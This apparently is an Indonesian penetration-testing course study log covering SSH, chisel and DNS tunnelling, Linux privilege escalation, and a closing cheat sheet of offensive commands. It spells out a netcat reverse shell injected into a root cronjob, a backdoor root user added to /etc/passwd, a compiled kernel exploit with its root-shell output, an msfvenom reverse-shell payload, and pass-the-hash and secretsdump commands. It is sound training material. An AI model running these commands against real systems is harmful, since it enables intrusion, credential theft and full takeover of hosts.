Disini, kita berhasil compromised machine A, dimana pada machine A ini kita ingin jadikan relay socks untuk akses pada machine B(internal) jadi caranya yaitu melakukan dynamic forwarding  dari machine A ke machine B(internal) yang expose port untuk dijadikan listener.

Contoh disini, kita membuka port 9999 yang akan kita jadikan listener proxy dilanjut SSH ke machine B(internal) pada IP 10.4.50.215
```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

Selanjutnya, port 9999 akan berjalan jadi kita akan setup proxychains pada local kali kita di file /etc/proxychains4.conf dan kita tambahkan pada baris paling bawah

```
socks5 192.168.50.63 9999
```

Dimana IP 192.168.50.63 merupakan machine A yang akan kita gunakan lompatan untuk akses ke machine B(internal) di port yang sudah kita tentukan sebelumnya. Kemudian kita dengan mudah akses jaringan pada subnet internal yang seolah olah request kita berasal dari machine B(internal) menggunakan proxychains 
```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

Kita juga bisa menggunakan proxychains untuk melakukan nmap scanning pada top 20 port seperti berikut: 
```
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
```


#### Remote Port Forwarding 

Dengan local port forwarding kita bisa melakukan pivoting pada internal network, tapi bagaimana jika ada suatu firewall maupun IDS/IPS yang memblock semua inbound traffic kita ? jadi solusinya yaitu dengan Remote Port Forwarding, jadi alih alih kita buka suatu koneksi/port pada machine yang compromised, disini kita akan melakukan SSH pada local machine kita dari machine yang sudah compromised. 

Jadi dengan remote port forwarding, kita akan membuka koneksi SSH ke machine attacker dari machine korban dengan host / port tujuan yang kita tentukan, dan nantinya attacker akan bisa akses host tersebut secara local. Jadi kita perlu start ssh dulu 

```
sudo systemctl start ssh

//check port
sudo ss -ntplu
```
dan pada file **/etc/ssh/sshd_config** set **PasswordAuthentication** ke Yes

Dan jika berhasil dan port 22 terbuka, kita bisa langsung melakukan forwarding dari host victim. Contoh dibawah ini, kita akan membuka port 2345 pada machine attacker yang pada port tersebut akan memforward ke 10.4.50.215 di port 5432

```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

dan cek di local kita 
```
ss -ntplu
```

Jika port 2345 ada, maka port forwarding seharusnya berhasil. dan kita bisa langsung akses service postgres yang sudah kita lakukan forward 

```
psql -h 127.0.0.1 -p 2345 -U postgres
```


##### SSH Remote Dynamic Port Forwarding

Disini konsepnya sama seperti Remote Port Forwarding, tapi alih alih hanya 1 koneksi dan host kita bisa membuatnya menjadi dinamis, dan kita juga akan memanfaatkan socks dan proxychains.

Dibawah ini, kita buka port 9998 pada local kali dari machine yang compromised
```
ssh -N -R 9998 kali@192.168.118.4
```
selanjutnya kita konfigurasi pada /etc/proxychains4.conf dengan penyesuaian host dan port pada bagian bawah

```
socks5 127.0.0.1 9998
```

lalu kita coba nmap dengan proxychains seharusnya internal network berhasil diakses 
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```


##### Using shuttle

Menggunakan manual ssh binary akan sangat ribet, tapi untungnya ada tools untuk melakukan automation hal ini. Anggaplah, kita ingin melakukan enumeration pada subnet jaringan B internal melalui perantara host A yang compromised.

Yang pertama kita pasti perlu untuk SSH pada host B, tapi karena kita tidak bisa karena host B berada pada segment local, maka kita set dulu dari host A untuk forward ssh ke host B menggunakan socat

```
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

jadi command diatas, host A akan membuka port 2222 yang meneruskan ke host B pada port 22. Selanjutnya tinggal kita running sshuttle pada local machine kita

Dibawah ini, kita akan melakukan koneksi SSH pada host B melalui host A dan dengan shuttle kita bisa menentukan subnet yang akan kita lakukan enumeration dengan catatan subnet tersebut ada dan tersimpan pada routing table 
```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

Setelah berhasil seharusnya kita bisa langsung lakukan akses smb pada IP internal

```
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```


##### Windows Tools

###### ssh.exe
Ini sama saja seperti ssh binary pada linux, jadi kita bisa melakukan dynamic port forwarding dari sini seperti 

```
ssh -N -R 9998 kali@192.168.118.4
```

dan set /etc/proxychains4.conf ke : 
```
socks5 127.0.0.1 9998
```

yang nantinya bisa langsung diakses 

```
proxychains psql -h 10.4.50.215 -U postgres
```


###### plink.exe

Plink juga bisa digunakan untuk melakukan port forwarding, contohnya kita akan membuka port 9833 pada local kali yang dimana port ini akan memforward pada port 3389(RDP) pada machine windows.

```
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4


//or auto confirmation

cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

dan jika cek portnya ada maka seharusnya berhasil
```
ss -ntplu
```

Jadi kita bisa langsung melakukan login RDP melalui port 9833

```
xfreerdp3 /u:offsec /p:lab /v:127.0.0.1:9833 /sec:nla

```

###### netsh

Sebenarnya ada cara default untuk melakukan port di windows menggunakan netsh tapi hal ini memerlukan akses administrator.

Jadi perintah dibawah ini kita melisten port 2222 pada machine A yang sudah kita compromised dan port 2222 ini yang jika kita lakukan koneksi akan memforward ke IP internal 10.4.50.215 pada port 22

```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

Lalu untuk ceknya apakah port forwarding berjalan, bisa menggunakan netstat
```
netstat -anp TCP | find "2222"
```
Jika ada, maka seharusnya berhasil. dan disini kita juga bisa untuk melihat seluruh konfigurasi netsh
```
netsh interface portproxy show all
```

Disini kita tidak bisa langsung melakukan koneksi pada port 2222 karena adanya firewall dan oleh karena itu kita bisa allow/izinkan agar bisa diakses dari public

```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

dan seharusnya kita bisa melakukan login ssh dengan lancar

```
ssh database_admin@192.168.50.64 -p2222
```

Setelah itu kita bisa menghapus rule tersebut jika tidak dipakai dengan command : 

```

//using name
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"


//using rule 
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

#### Learn day 20
disini kita akan belajar module tentang tunneling through deep packet inspection. Yang pertama, kita akan menggunakan chisel untuk melakukan tunneling dan pivoting

https://github.com/jpillora/chisel/releases

secara sederhana, saat kita menggunakan chisel, kita perlu melakukan setup server chisel terlebih dahulu pada local machine kita yang nantinya server chisel ini yang akan kita gunakan untuk terhubung melalui chisel client.

```
chisel server --port 8080 --reverse
```

Kita membuka port 8080 dengan flag reverse untuk allow port forward dan pada machine yang akan kita tunneling, kita akan melakukan run chisel client

```

//sesuaikan ip dan port chisel server 
chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

tapi kadangkala, pada saat run chisel seringkali inkompatibilitas terjadi karena versi glibc yang lebih rendah. Untuk mengatasi hal ini kita perlu download binary versi 1.8.1

```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz

gunzip chisel_1.8.1_linux_amd64.gz
```

Dan ulangi langkah awal dan jika berhasil, maka representasi dari socks merupakan port 1080 yang kita bisa verifikasi melalui netstat.  jadi saat kita ingin terhubung ke jaringan local melalui SSH, kita tidak bisa menggunakan command proxychains karena protocol SSH tidak support hal itu dan sebagai gantinya kita menggunakan opsi ProxyCommand dan ncat.

```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

Jadi command diatas intinya melakukan forwarding melalui ncat ke socks proxy pada port 1080 yang kita run via chisel dan dengan ini seharusnya berhasil.



##### DNS tunneling
Sekarang kita akan belajar tentang tunneling melalui DNS. jadi DNS merupakan protokol translasi dari alamat IP ke domain yang dapat dibaca manusia begitupun sebaliknya. pada DNS terdapat beberapa record salah satunya yaitu A record yang merupakan suatu record untuk pointing pada IP address.

Jadi DNS menggunakan serangkaian query untuk menemukan alamat IP yang sesuai pada beberapa server(dikenal dengan resolver). urutan query seperti ini :

- User request ke abc.com 
- resolver DNS akan menghubungi root nameserver untuk mencari TLD nameserver
- TLD nameserver .com ditemukan
- Resolver menanyakan .com dan mencari nameserver authoritative untuk abc.com
- Authoritative nameserver meresponse dengan A record berupa IP address

Semua komunikasi dari dns ini menggunakan UDP yang berada pada port 53.


##### Practical
mungkin lumayan ribet untuk sisi prakteknya, tapi kita akan mencoba untuk memahami hal ini. anggaplah kita mempunyai 3 server yaitu :

- server A(bertindak untuk authoritative zone DNS feline.corp)
- server B(merupakan resolver DNS untuk server C)
- server C(server di jaringan internal)


jadi saat kita bisa compromised pada server A, kita bisa melakukan konfigurasi DNS berbahaya dengan skenario berikut : 

buat file dnsmasq_txt.conf pada server A 
```
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

lalu aktifkan dns pada port 53 menggunakan dnsmasq
```
sudo dnsmasq -C dnsmasq_txt.conf -d

//atau bisa inspection menggunakan tcpdump pada shell lain
sudo tcpdump -i ens192 udp port 53
```

Sekarang di server C untuk melihat resolver :

```
resolvectl status

//output

DNSOverTLS setting: no         
DNSSEC setting: no         
DNSSEC supported: no         
Current DNS Server: 10.4.50.64
DNS Servers: 10.4.50.64
```

Dimana 10.4.50.64 merupakan server B yang disini artinya server C akan melakukan query ke server B setiap melakukan DNS resolving, dan server B akan meneruskan query pada authoritative nameserver yang berada pada server A.

Contoh kita melakukan resolve pada server C 

```
//txt
nslookup -type=txt www.feline.corp
```

Disini server C akan menghubungi server B dan server B akan meneruskan query pada server A(authoritative) sehingga tcpdump pada server A akan terdapat packet DNS seperti berikut :

```
03:16:42.495429 IP 192.168.201.64.54651 > 192.168.201.7.domain: 18830+ [1au] TXT? www.feline.corp. (44)
03:16:42.495528 IP 192.168.201.7.domain > 192.168.201.64.54651: 18830 2/0/1 TXT "here's something else less useful.", TXT "here's something useful!" (128)
```

#### Learn day 21

Sekarang kita akan belajar terkait tunneling menggunakan dnscat. Jadi pada module sebelumnya kita punya 3 server yaitu server A, B dan C yang dimana server A merupakan nameserver authoritative untuk feline.corp dan sedangkan server C yang akan kita lakukan tunneling DNS.


Masuk ke server C dengan port forwarding pada server DMZ

```
ssh -N -R 127.0.0.1:2222:10.4.200.215:22 kali@192.168.45.192
```

Kita buka koneksi port 2222 pada local ke server C melalui server DMZ. selanjutnya kita ssh pada local machine kita

```
ssh database_admin@localhost -p 2222
```

setelah berhasil, kita running dnscat server pada server A dengan command : 

```
dnscat2-server feline.corp
 
 
//kita juga bisa melakukan inspect monitoring dengan tcpdump
sudo tcpdump -i ens192 udp port 53
```

Lanjut ke server C, kira running dnscat ke domain feline.corp

```
./dnscat feline.corp
```

Jika connection established artinya sukses, dan lanjut ke server A :

```
//untuk list session
windows

//untuk memilih window pada nomor 1
window -i 1


//setelah itu kita bisa listen seperti 
listen 0.0.0.0:4445 172.16.200.217:445

//atau local
listen 127.0.0.1:4445 172.16.200.217:445
```

Disini kita melakukan forwarding pada port 4445 ke 172.16.200.217:445 yang dimana kita bisa langsung melakukan koneksi smb dari local maupun public IP server A

```
//koneksi ke server A dari attacker machine
smbclient -p 4445 -L //192.168.200.7 -U hr_admin --password=Welcome1234


//atau koneksi dari local server A 
smbclient -p 4445 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```


##### Linux Privilege Escalation

Selanjutnya yaitu Privilege Escalation pada linux jadi kita akan bahas beberapa unit pembelajaran berikut : 

- Enumerating linux
- Exposed Confidential Information
- Insecure File Permissions
- Abusing System Linux Components

Jadi 4 topik ini yang akan kita bahas, jadi pertama kita mulai dari enumeration manual seperti cek user, kernel maupun hostname

```
//cek user
id

//melihat informasi user
cat /etc/passwd

//cek hostname
hostname

//cek detail dan versi sistem operasi
cat /etc/issue
cat /etc/os-release
uname -a

//cek informasi process
ps aux
ps auxfw


//cek konfigurasi ip dan network
ip a
ifconfig

//cek routing table 
route 
route l


//cek port terbuka
ss -anp
netstat -tulpn
ss -anp

//cek firewall rule(iptables)
cat /etc/iptables/rules.v4


//check cronjob
ls -la /etc/cron*
crontab -l

//check cronjob root
sudo crontab -l

//check installed app dpkg
dpkg -l


//find writable folder
find / -writable -type d 2>/dev/null
```

Pada sebagian sistem, kadangkala kita menemukan suatu file yang di mount(pasang) dan mungkin berisi informasi berharga jadi kita bisa melihat semua file drive dengan membaca /etc/fstab atau menggunakan mount command

```
cat /etc/fstab
mount

//untuk melihat semua disk
lsblk

//cek module kernel
lsmod

//Untuk informasi spesifik module kernel
/sbin/modinfo nama_module
/sbin/modinfo libata
```

Pada linux terdapat special permission untuk menjalankan suatu binary yang dikenal dengan SUID/SGID binary yang merupakan suatu binary yang jika dijalankan akan menjalankan dari user yang memiliki binary tersebut dan untuk itu kita bisa memanfaatkan find untuk menemukan SUID binary

```
find / -perm -u=s -type f 2>/dev/null
```


Jika diatas merupakan cara manual, kita juga bisa menggunakan cara yang lebih automated dengan linepeas dan unix-privesc-check

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
https://pentestmonkey.net/tools/audit/unix-privesc-check


##### Inspecting User Trails

salah satu target saat melakukan privesc yaitu ada pada dotfiles(file yg diawali dengan titik) dimana disini kadang menyimpan beberapa konfigurasi beserta credential user.

salah satu contohnya yaitu .bashrc, environment variable, .bash_history dan .profile. dan contoh skenario privesc pada lab ini yaitu kita mulai baca script bashrc

```
cat .bashrc 

//output: 
# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
```

Dimana ditemukan suatu export environment variable SCRIPT_CREDENTIAL, jadi kita bisa memverifikasi dengan 

```
printenv
```

Kita bisa langsung saja melakukan cred stuffing seperti 

```
su root
su - root
```
Dan masukkan password "lab" dan seharusnya berhasil, atau kita juga bisa melakukan generate wordlist menggunakan crunch

```
crunch 6 6 -t Lab%%% > wordlist
```

Dimana disini kita buat minimum dan maximum wordlist dengan 6 character dengan output seperti : 

```
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
```

Karena pada machine ini terdapat user eve, jadi kita bisa lanjut dengan hydra

```
hydra -l eve -P wordlist  192.168.200.214 -t 4 ssh -V
```

dan ditemukan password Lab123, lalu lanjut ssh dan cek sudo permission

```
sudo -l
```
Ternyata user mempunyai sudo all yang artinya kita bisa melakukan command apapun menggunakan sudo, dan untuk get root tinggal ketik 

```
sudo -i
```

##### Inspecting Service Footprint
Daemon merupakan service yang dijalankan saat booting tanpa memerlukan interkasi user. dan server linux kadang menjalankan banyak daemon. jadi attack surface pada service ini sangat tinggi dan untuk melakukan enumeration, kita harus memeriksa behaviour process yang sedang berjalan.

Jadi untuk itu kita perlu melakukan enumeration menggunakan command ps dan memantau process tiap 2 detik menggunakan watch

```

//grep yang berhubungan dengan kata "pass"
watch -n 1 "ps -aux | grep pass"

//or detailed
watch -n 1 "ps -auxfw | grep pass"
```

jadi dengan ini, kita bisa memantau daemon yang dimana kadang terdapat beberapa process yang berharga. dalam contoh ini kita berhasil melihat suatu process yang sedang berjalan dengan credential eve tiap beberapa detik

```
joe       3199  0.0  0.1   6504  3356 pts/0    S+   14:00   0:00 watch -n 1 ps -aux | grep pass
root      3234  0.0  0.0   2384   692 ?        S    14:00   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root      3235  0.0  0.0   2356  1700 ?        S    14:00   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
```

dan jika kita mempunyai izin untuk capture packet dengan tcpdump, kita juga bisa melihat dan menangkap credentialnya

```
sudo tcpdump -i lo -A | grep "pass"
```


#### Abuse cronjobs

Jadi teknik kali ini dengan memanfaatkan cronjob, jadi vector privesc pada cronjob bisa menjadi target utama kita dimana rumusnya saat ada suatu file / binary yang di eksekusi tiap interval waktu tertentu menggunakan cronjob dan binary tersebut dapat ditulis/writable, kita bisa memodifikasi isi dari file tersebut dan menunggu untuk


untuk melihat cronjob yang berjalan, kita bisa memeriksa file log 

```
grep "CRON" /var/log/syslog
//or
cat /var/log/cron.log | grep "CRON"


//output: 
Feb 15 13:53:54 debian-privesc CRON[1376]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Feb 15 13:54:01 debian-privesc CRON[1385]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Feb 15 13:55:01 debian-privesc CRON[1559]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

Dimana disini suatu cron dieksekusi sebagai root, dan karena writable jadi kita bisa memodifikasi untuk melakukan reverse shell pada file user_backups.sh

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.192 443 >/tmp/f" >> user_backups.sh
```

dan kita aktfikan listener pada port 443, tunggu beberapa menit sehrausnya reverse shell berhasil.

##### Abusing password authentication

Umumnya password di linux disimpan pada file /etc/shadow tetapi hal ini tidak bisa dibaca oleh user biasa dan secara historis, linux menyimpan semua informasi user pada /etc/passwd dan jika pada kolom kedua berisi password maka password tersebut dianggap valid. Kali ini anggaplah file /etc/passwd writable dan kita akan membuat user baru dan untuk itu kita perlu generate hash menggunakan openssl 
```
openssl passwd heker

//output: ogu/hx4Wd9V.Q
```

setelah itu kita perlu menulis pada file /etc/passwd dengan format berikut : 

```
echo "root2:ogu/hx4Wd9V.Q:0:0:root:/root:/bin/bash" >> /etc/passwd
```

lalu kita login dengan user root2 dan password heker 

```
su root2
```

dan seharusnya berhasil mendapatkan root



##### Setuid binary & Capabilities

Seperti yang dibahas diatas, setuid binary merupakan suatu binary yang jika kita menjalankannya, binary tersebut akan dijalankan dengan hak akses pemilik/owner file tersebut. 

Untuk melakukan enumeration kita bisa menggunakan find 
```
find / -perm -u=s -type f 2>/dev/null
```

Disini terlihat binary find mempunyai setuid binary, jadi kita bisa memanfaatkan binary find untuk meningkatkan hak akses

```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

Dan kedua ada capabilities, yang merupakjan atribut tambahakn pada suatu binary, process maupun service untuk memberikan suatu privilege tertentu. capabilities ini jika salah dikonfigurasi juga dapat dimanfaatkan untuk privilege escalation.

Untuk identifikasi kita bisa menjalankan command getcap

```
/usr/sbin/getcap -r / 2>/dev/null

//output: 
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
```

Terlihat ada output binary perl dengan setuid aktif bersama dengan flag +ep yang menentukan jika capabilities ini diizinkan. jadi kita bisa manfaatkan perl untuk melakukan privilege escalation

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```


untuk lebih lengkapnya dari miskonfigurasi setuid dan capabilites bisa langsung kunjungi https://gtfobins.org/


#### Sudo Abuse
Sudo merupakan utilitas untuk melakukan eksekusi process, file dengan hak akses root dan konfigurasi ditetapkan pada file /etc/sudoers

Dan untuk menampilkan command apa yang diset untuk dieksekusi dengan sudo kita bisa ketik 
```
sudo -l

//output:
User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

Kebetulan, output disini terdapat binary crontab, tcpdump dan apt-get. mulai dengan tcpdump dulu

```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

disini sebenarnya tekniknya valid, tapi output menunjukkan permission denied dan jika kita cek log

```
cat /var/log/syslog | grep tcpdump
```

Ternyata berasal dari apparmor, dan apparmor merupakan kernel module yang memproteksi dan menyediakan MAC(mandatory access control) pada linux dan aktif secara default pada debian 10. kita bisa verif dengan command 

```
aa-status
```

Jadi kita lanjut dengan apt-get, dengan acuan gtfobins kita bisa melakukan serangkaian command berikut

```
sudo apt-get changelog apt
!/bin/sh
```
yang seharusnya akan spawning shell root.


##### Kernel exploitation
Kernel exploitation merupakan eksploitasi langsung pada kernel dan salah satu cara terbaik untuk melakukan privesc. Kernel exploit juga tergantung dari versi dan juga jenis operating system-nya.

jadi untuk identifikasi seperti berikut  :

```
cat /etc/issue 
//output: Ubuntu 16.04.4 LTS \n \l

uname -r 
//output: 4.4.0-116-generic

arch
//output: x86_64
```

Dengan informasi diatas, kita bisa cari dengan searchsploit untuk exploit yang relevan

```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

//or
searchsploit "Ubuntu 16" | grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
```

dan ditemukan exploit yang cocok 

```
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c
```

dan tinggal kita download lalu tranfer pada machine target

```
searchsploit -m linux/local/45010.c    

//transfer
scp 45010.c joe@192.168.200.216:~/ 
```

lalu compile pada machine target

```
gcc 45010.c -o exploit
```

dan seharusnya sukses saat exploit dijalankan

```
joe@ubuntu-privesc:~$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880078fa8200
[*] Leaking sock struct from ffff880075c82000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88007c2d1c00
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff88007c2d1c00
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
```

#### Random Notes
enable color winpeas
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```


msfvenom 

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b '\x00\x01\x0d' -f exe -o rev.exe
```

msfconsole auto 

```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```


enum4linux

```
enum4linux -u 'Eric.Wallows' -p 'EricLikesRunning800' -a 192.168.200.97
```

netexec check pass the hash

```

//check global
netexec smb 192.168.200.97 -u administrator -H a51493b0b06e5e35f855245e71af1d14

//check if local user / administrator
netexec winrm 192.168.200.95 -u Administrator -H a51493b0b06e5e35f855245e71af1d14 --local-auth

//check range IP crackmapexeec
crackmapexec smb 192.168.200.95-97 -u apache -p 'New2Era4.!' --local-auth

```


ffuf scanning directory

```
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt


//filter size
ffuf -u http://192.168.200.95:5001/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 132

```


powershell bypass current session

```
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy RemoteSigned
```

plink exe
```
//get hostkey 
.\plink.exe -ssh -l kali -pw kali -batch -N -R 127.0.0.1:15432:127.0.0.1:15432 192.168.45.192


//remote port forward
.\plink.exe -ssh -l kali -pw kali -hostkey SHA256:EpHzkV4SVv0aJ3xqJeiFN5UWEzt8SzCVsUtwMqeNuDo -N -R 127.0.0.1:15432:127.0.0.1:15432 192.168.45.192


//multi remote 

.\plink.exe -ssh -l kali -pw kali -hostkey SHA256:EpHzkV4SVv0aJ3xqJeiFN5UWEzt8SzCVsUtwMqeNuDo -N -R 127.0.0.1:15432:127.0.0.1:15432 -R 127.0.0.1:1337:127.0.0.1:1337 192.168.45.192
```

powershell test connection

```
Test-NetConnection -ComputerName 127.0.0.1 -Port 3306
```

enable RDP

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```


bloodhound-python untuk koleksi semua data yang diperlukan

```
//ns merupakan ip dc
 bloodhound-python -u charlotte -d secura.yzx -ns 192.168.200.97 -v --zip -c All 
```

GPO Abuse
```
.\SharpGpoAbuse.exe --AddLocalAdmin --UserAccount heker --GPOName "Default Domain Policy"

.\standin.exe --gpo --filter "Default Domain Policy" --localadmin charlotte
```

powershell process hidden 

```
Start-Process -FilePath "chisel.exe" -ArgumentList "client 192.168.45.161:8080 R:socks" -WindowStyle Hidden
```

secretdump / dcsync pth

```
proxychains impacket-secretsdump beccy@172.16.71.240 -hashes :f0397ec5af49971f6efbdb07877046b3
```

tcpdump packet inspection

```
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

bloodhound query cheatsheet

```
//semua nodes
MATCH (n) RETURN n 

//semua user nodes(computer/group domain)
MATCH (n:User) RETURN n


//cek spesifik user tertentu
MATCH (x:User) WHERE x.name='MARCUS@BEYOND.COM' RETURN x
```
